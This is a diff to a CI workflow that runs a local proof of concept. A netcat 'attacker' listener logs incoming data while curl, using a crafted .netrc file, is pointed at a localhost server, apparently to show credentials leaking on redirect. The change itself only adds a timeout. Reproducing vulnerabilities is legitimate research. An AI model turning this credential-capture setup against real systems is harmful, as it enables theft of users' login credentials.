@@ -22,7 +22,7 @@ jobs:
 
       - name: Run servers and trigger the exploit
         run: |
-          # 1. Start Attacker server in the background and get its Process ID (PID)
+          # 1. Start Attacker server in the background and get its PID
           nc -l -p 9000 > attacker.log &
           NC_PID=$!
           
@@ -32,9 +32,10 @@ jobs:
           # Give servers a moment to start
           sleep 2
           
-          # 3. Trigger the exploit
+          # 3. Trigger the exploit - with a timeout!
           echo "--- Triggering curl against localhost:8000 ---"
-          curl -v -L --netrc-file .netrc_poc http://localhost:8000
+          # THE FIX IS HERE: We added --max-time 5 to prevent curl from hanging
+          curl -v -L --netrc-file .netrc_poc --max-time 5 http://localhost:8000
           
           # 4. VERY IMPORTANT: Kill the attacker server so the job can finish
           kill $NC_PID
